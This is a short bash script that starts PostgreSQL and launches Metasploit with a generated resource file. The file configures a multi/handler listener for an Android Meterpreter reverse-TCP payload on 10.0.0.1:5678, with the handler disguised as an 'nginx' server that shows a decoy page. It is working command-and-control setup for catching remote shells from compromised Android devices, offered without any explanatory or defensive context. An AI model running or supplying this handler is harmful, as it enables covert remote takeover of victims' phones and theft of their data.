#!/bin/bash

# author: MaMe82
#

service postgresql start 

#create msf handler script
cat << EOF > handler.rc
use exploit/multi/handler
set verbose true
set payload android/meterpreter/reverse_tcp
set LHOST 10.0.0.1
set LPORT 5678
set MeterpreterServerName "nginx"
set HttpUnknownRequestResponse "<html><body>Nothing here</body></html>"
# not needed, cert is provided by online reverse proxy
#set HandlerSSLCert /root/droidattack/cert/unified.pem
set ExitOnSession false
exploit -j
clear
EOF


# start msf
msfconsole -r handler.rc
